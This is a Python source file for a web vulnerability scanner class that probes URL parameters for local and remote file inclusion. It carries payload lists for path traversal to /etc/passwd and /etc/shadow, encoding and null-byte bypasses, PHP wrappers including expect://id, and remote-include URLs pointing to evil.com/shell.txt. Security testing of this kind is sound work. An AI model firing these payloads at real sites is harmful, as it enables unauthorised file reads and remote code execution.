#!/usr/bin/env python3
"""
LFI/RFI 检测器 - 基于 BaseDetector 重构

支持检测类型:
- 本地文件包含 (LFI)
- 远程文件包含 (RFI)
- PHP 伪协议利用
- 路径遍历
"""

import re
from typing import Dict, List, Any, Optional
from urllib.parse import quote, urlparse

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from tools.detectors.base import BaseDetector, Vulnerability


class LFIDetector(BaseDetector):
    """LFI/RFI 文件包含检测器"""

    # 覆盖默认测试参数
    DEFAULT_PARAMS = [
        "file", "page", "include", "path", "doc", "document",
        "folder", "root", "pg", "style", "template", "php_path",
        "lang", "language", "dir", "load", "read", "content"
    ]

    # LFI Payload (payload, indicator)
    LFI_PAYLOADS = [
        # Linux 路径遍历
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%2f..%2f..%2fetc/passwd", "root:"),
        ("..%252f..%252f..%252fetc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("../../../etc/shadow", "root:"),
        ("../../../etc/hosts", "localhost"),
        # Windows 路径遍历
        ("....\\....\\....\\windows\\win.ini", "[fonts]"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]"),
        ("C:\\windows\\win.ini", "[fonts]"),
        ("C:/windows/win.ini", "[fonts]"),
        # Null 字节绕过 (PHP < 5.3.4)
        ("../../../etc/passwd%00", "root:"),
        ("../../../etc/passwd\x00.jpg", "root:"),
        # 双重编码
        ("..%252f..%252f..%252fetc%252fpasswd", "root:"),
    ]

    # PHP 伪协议 Payload
    PHP_WRAPPER_PAYLOADS = [
        # php://filter - 读取源码
        ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
        ("php://filter/read=string.rot13/resource=index.php", "<?cuc"),
        ("php://filter/convert.base64-encode/resource=config.php", "PD9waHA"),
        ("php://filter/convert.base64-encode/resource=../config.php", "PD9waHA"),
        # php://input - 需要 POST
        # data:// - 数据流
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo"),
        # expect:// - 命令执行 (需要 expect 扩展)
        ("expect://id", "uid="),
    ]

    # RFI Payload
    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.txt",
        "//evil.com/shell.txt",
        "http://127.0.0.1:8080/shell.txt",
    ]

    # 成功指示器
    LINUX_INDICATORS = [
        "root:", "daemon:", "bin:", "nobody:",
        "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
    ]

    WINDOWS_INDICATORS = [
        "[fonts]", "[extensions]", "for 16-bit app support",
        "[mci extensions]", "[files]",
    ]

    # 错误指示器 (可能表明存在漏洞)
    ERROR_INDICATORS = [
        "failed to open stream",
        "no such file or directory",
        "include_path",
        "failed opening",
        "warning: include",
        "warning: require",
        "fatal error",
        "fopen(",
        "file_get_contents(",
    ]

    def get_payloads(self) -> Dict[str, List]:
        """获取 Payload 库"""
        return {
            "LFI": self.LFI_PAYLOADS,
            "PHP Wrapper": self.PHP_WRAPPER_PAYLOADS,
            "RFI": self.RFI_PAYLOADS,
        }

    def validate_response(
        self,
        response: Dict[str, Any],
        payload: str,
        baseline: Dict[str, Any] = None
    ) -> bool:
        """验证响应是否表明存在文件包含漏洞"""
        if not response or not response.get("success"):
            return False

        resp_text = response.get("response_text", "")

        # 检查 Linux 指示器
        for indicator in self.LINUX_INDICATORS:
            if indicator in resp_text:
                return True

        # 检查 Windows 指示器
        for indicator in self.WINDOWS_INDICATORS:
            if indicator in resp_text:
                return True

        # 检查 Base64 编码的 PHP 代码
        if "PD9waHA" in resp_text:  # <?php 的 base64
            return True

        return False

    def detect_lfi(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测本地文件包含"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params[:5]:  # 限制参数数量
            for payload, indicator in self.LFI_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                # 检查指示器
                if indicator in resp_text:
                    # 判断 OS 类型
                    os_type = "Windows" if indicator in ["[fonts]", "[extensions]"] else "Linux"

                    vulnerabilities.append(Vulnerability(
                        type="Local File Inclusion (LFI)",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"检测到 {os_type} 文件内容: {indicator}",
                        verified=True,
                        confidence=0.95,
                        details={
                            "os_type": os_type,
                            "indicator": indicator,
                            "response_length": len(resp_text)
                        }
                    ))
                    break  # 找到一个就停止该参数的测试

        return vulnerabilities

    def detect_php_wrapper(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测 PHP 伪协议利用"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params[:5]:
            for payload, indicator in self.PHP_WRAPPER_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "")

                if indicator in resp_text:
                    wrapper_type = payload.split("://")[0] if "://" in payload else "unknown"

                    vulnerabilities.append(Vulnerability(
                        type=f"PHP Wrapper Exploitation ({wrapper_type}://)",
                        severity="CRITICAL",
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"PHP 伪协议利用成功: {wrapper_type}://",
                        verified=True,
                        confidence=0.9,
                        details={
                            "wrapper_type": wrapper_type,
                            "indicator": indicator,
                            "response_length": len(resp_text)
                        }
                    ))
                    break

        return vulnerabilities

    def detect_rfi(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测远程文件包含"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        for test_param in test_params[:5]:
            for payload in self.RFI_PAYLOADS:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "").lower()

                # 检查 RFI 指示器
                rfi_indicators = [
                    "evil.com",
                    "failed to open stream",
                    "allow_url_include",
                    "allow_url_fopen",
                ]

                found_indicator = None
                for indicator in rfi_indicators:
                    if indicator in resp_text:
                        found_indicator = indicator
                        break

                if found_indicator:
                    # 区分确认的 RFI 和潜在的 RFI
                    if "evil.com" in resp_text:
                        vuln_type = "Remote File Inclusion (RFI)"
                        severity = "CRITICAL"
                        confidence = 0.9
                    else:
                        vuln_type = "Potential RFI"
                        severity = "HIGH"
                        confidence = 0.7

                    vulnerabilities.append(Vulnerability(
                        type=vuln_type,
                        severity=severity,
                        param=test_param,
                        payload=payload,
                        url=response.get("url", url),
                        evidence=f"RFI 指示器: {found_indicator}",
                        verified=False,
                        confidence=confidence,
                        details={
                            "indicator": found_indicator,
                            "response_length": len(resp_text)
                        }
                    ))
                    break

        return vulnerabilities

    def detect_error_based(
        self,
        url: str,
        param: Optional[str] = None
    ) -> List[Vulnerability]:
        """检测基于错误的文件包含 (可能存在漏洞)"""
        vulnerabilities = []
        test_params = self.get_test_params(param)

        # 使用可能触发错误的 Payload
        error_payloads = [
            "../../../nonexistent_file_12345",
            "/etc/nonexistent_12345",
            "C:\\nonexistent_12345",
        ]

        for test_param in test_params[:5]:
            for payload in error_payloads:
                encoded_payload = quote(payload, safe='')
                response = self.send_request(url, encoded_payload, test_param)

                if not response or not response.get("success"):
                    continue

                resp_text = response.get("response_text", "").lower()

                # 检查错误指示器
                for indicator in self.ERROR_INDICATORS:
                    if indicator in resp_text:
                        vulnerabilities.append(Vulnerability(
                            type="Potential File Inclusion",
                            severity="MEDIUM",
                            param=test_param,
                            payload=payload,
                            url=response.get("url", url),
                            evidence=f"文件操作错误信息: {indicator}",
                            verified=False,
                            confidence=0.5,
                            details={
                                "indicator": indicator,
                                "response_length": len(resp_text)
                            }
                        ))
                        break

        return vulnerabilities

    def detect(
        self,
        url: str,
        param: Optional[str] = None,
        deep_scan: bool = True
    ) -> Dict[str, Any]:
        """
        LFI/RFI 检测入口

        Args:
            url: 目标 URL
            param: 指定参数 (可选)
            deep_scan: 是否深度扫描 (包含 PHP 伪协议和 RFI 检测)

        Returns:
            检测结果字典
        """
        all_vulnerabilities = []

        # 1. 本地文件包含检测
        lfi_vulns = self.detect_lfi(url, param)
        all_vulnerabilities.extend(lfi_vulns)

        if deep_scan:
            # 2. PHP 伪协议检测
            wrapper_vulns = self.detect_php_wrapper(url, param)
            all_vulnerabilities.extend(wrapper_vulns)

            # 3. 远程文件包含检测
            rfi_vulns = self.detect_rfi(url, param)
            all_vulnerabilities.extend(rfi_vulns)

            # 4. 错误检测 (仅当未发现确定漏洞时)
            if not lfi_vulns and not wrapper_vulns and not rfi_vulns:
                error_vulns = self.detect_error_based(url, param)
                all_vulnerabilities.extend(error_vulns)

        # 二次验证
        verified_vulns = []
        for vuln in all_vulnerabilities:
            if not vuln.verified:
                if self.verify_vulnerability(vuln):
                    vuln.verified = True
                    vuln.confidence = min(1.0, vuln.confidence + 0.15)
            verified_vulns.append(vuln)

        return {
            "success": True,
            "url": url,
            "detector": self.__class__.__name__,
            "vulnerabilities": [v.to_dict() for v in verified_vulns],
            "total": len(verified_vulns),
            "verified_count": sum(1 for v in verified_vulns if v.verified),
            "by_type": {
                "lfi": sum(1 for v in verified_vulns if "LFI" in v.type or "Local" in v.type),
                "rfi": sum(1 for v in verified_vulns if "RFI" in v.type or "Remote" in v.type),
                "php_wrapper": sum(1 for v in verified_vulns if "PHP" in v.type),
                "potential": sum(1 for v in verified_vulns if "Potential" in v.type),
            }
        }


# 便捷函数 - 兼容旧接口
def lfi_detect(url: str, param: str = None, deep_scan: bool = True) -> Dict[str, Any]:
    """LFI/RFI 检测 (兼容旧接口)"""
    with LFIDetector() as detector:
        return detector.detect(url, param, deep_scan)
